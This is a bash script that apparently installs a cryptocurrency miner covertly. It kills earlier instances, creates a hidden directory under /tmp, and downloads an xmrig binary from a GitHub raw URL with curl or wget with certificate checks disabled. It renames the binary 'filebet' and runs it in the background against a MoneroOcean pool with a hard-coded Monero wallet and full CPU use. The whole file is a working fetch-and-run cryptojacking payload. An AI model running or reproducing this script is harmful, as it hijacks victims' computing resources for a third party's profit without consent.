#!/bin/bash
local="/tmp/.work/.filebet/"
kill -9 `ps -e|grep filebet|awk '{print $1}'` 2>/dev/null
rm -rf "$local" 2>/dev/null
mkdir -p "$local"	
if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static1.txt" -o "$local"filebet 2>/dev/null && ! wget -q --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static1.txt -O "$local"filebet 2>/dev/null; then
printf "[ERROR]: downloading xmrig\n"
exit 1
fi
chmod +x "$local"filebet
exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `hostname` -k --cpu-max-threads-hint=100% -B
